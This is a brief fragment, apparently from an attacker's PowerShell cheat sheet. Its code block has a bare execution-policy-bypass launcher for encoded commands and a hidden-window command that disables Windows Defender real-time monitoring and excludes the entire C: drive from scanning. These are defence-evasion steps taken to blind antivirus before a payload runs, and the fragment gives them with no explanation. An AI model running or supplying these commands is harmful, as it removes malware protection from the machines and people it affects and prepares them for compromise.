...
```ps
powershell -nop -exec bypass -EncodedCommand 

powershell.exe -exec bypass -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue; Set-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue"
```
